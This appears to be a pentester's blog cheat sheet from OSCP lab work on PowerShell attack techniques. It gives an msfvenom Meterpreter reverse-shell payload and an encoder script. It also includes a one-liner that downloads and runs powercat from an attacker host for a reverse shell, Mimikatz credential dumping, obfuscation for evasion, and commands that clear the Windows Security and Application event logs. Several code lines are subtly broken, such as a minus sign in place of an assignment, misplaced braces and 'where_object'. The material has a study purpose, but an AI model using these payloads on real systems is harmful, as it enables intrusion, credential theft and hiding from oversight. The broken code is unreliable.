During the process of working thru my OSCP labs I've been doing a ton of work
with Windows Powershell from the perspective of a security auditor/pentester.
Worked correctly, like almost anything it can be utilized into a valuable tool
when compromising a network/machine.

Shelling the System

Using PowerShell to Launch Meterpreter from Memory
You'll need:
Metasploit 4.5+
PowerShell x86 with 32 bit Meterpreter payloads
encodedMeterpreter.ps1 script found below

On Attack Box (making payload, using powershell to encode a runable string)

	  ./msfvenom -p windows/meterpreter/reverse_https -f psh -a x86 LHOST:1.1.1.1
    LPORT:4444 > audit.ps1

    mv audit.ps1 <same folder as encodedMeterpreter.ps1>

Launch PowerShell x86

    > powershell.exe -executionpolicy bypass encodedMeterpreter.ps1

    cp encoded string

Start Listener (use your desired payload, then load handler over it for proper use)

    ./msfconsole

    use windows/meterpreter/reverse_https

    handler -H 10.10.1.1 -P 4444 -p windows/meterpreter/reverse_https

On Target Windows Machine (need some kind of ftp webshell delivered cmdasp.aspx)

    > powershell.exe -noexit -encodedCommand <paste encoded string output from
    encodedMeterpreter.ps1>


encodedMeterpreter.ps1 Script:

    # Get Contents of Scripts
    $contents - Get-Content audit.ps1

    # Compress Script
    $ms = New-Object IO.MemoryStream
    $action = [IO.Compression.CompressionMode]::Compress
    $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
    $contents | ForEach-Object {$sw.WriteLine($_)}
    $sw.Close()

    # Base64 Encode Stream
    $code = [Convert]::ToBase64String{$ms.ToArray()}
    $command = "Invoke-Expression '$(New-Object IO.StreamReader ('$(New-Object IO.    Compression.DeflateStream ('$(New-     Object IO.MemoryStream
    ((,'$([Convert]::FromBase64String('"$code'")))),
    [IO.Compression.CompressionMode]::Decompress)),
    [Text.Encoding]::ASCII)).ReadToEnd();"

    # Invoke-Expression $command
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)

    # Write to Standard Out
    Write-Host $encodedCommand



Cheat Sheet

PowerShell One Liner Reverse-Shelling (in your webshell cmdasp.aspx)

    nc -lvn -p 4444


Or you can use PowerCat.ps1 script hosted and get your shell that way.

Host your powercat files

   	python -m SimpleHTTPServer 8080

Use your cmdasp.aspx webshell to force download and execution of powercat.ps1
& get your reverse shell

   	powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString
   	('http://10.10.10.1/powercat.ps1'));powercat -c 10.10.10.1 -p 4444 -ep"


So Once you've attained your shell you want the ability to get credentials and
escalate priviledges.  The quick and easy way to do this, while maintaining
obfuscation is to use Mimikatz & Invoke-Obfuscation from PowerSploit/Empire.
Using one of the methods we covered above get the Invoke-Mimikatz.ps1 & the Invoke-Obfuscation.psd1
suite uploaded.  Now we want to use PowerShell to import those modules and execute.
This is the easiest way and often with windows 10 the only way that will work.
Using PowerCat's Reverse shell, and running both the Import-Module & execute command
inline, NOT SEPERATE!  Like so:

   	powershell Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -DumpCreds

   	powershell Import-Module .\Invoke-Obfuscation.psd1; Invoke-obfuscation



PowerShell CHEATS (ALL WITH powershell prefix included)

   	stop-transcript                            Stops Recording
   	get-content <file>                         display file Contents
   	get-help <command> -Examples               shows examples of commands
   	get-command '<string>'                     searchs for cmd string
   	get-service                                displays services
   	get-wmiobject -class win32_service         alternate creds
        $PSVersionTable                            display powershell version
   	-version 2.0                               run powershell 2.0
	get-service | measure-object               returns # of services
   	get-psdrive                                returns list of psdrives
   	get-process | select -expandproperty name  returns only names
   	get-help * -parameter credential           cmdlets that take creds
   	get-wmiobject -list "network [Net.DNS]::GetHostEntry("<ip>")     dns lookup

Clear Security & Application Event Log for Remote Services

   	Get-EventLog -list
   	Clear-EventLog -logname Application, Security -computername SRV01

List Running Services

   	Get-Service | where_object ($_.status -eq "Running")

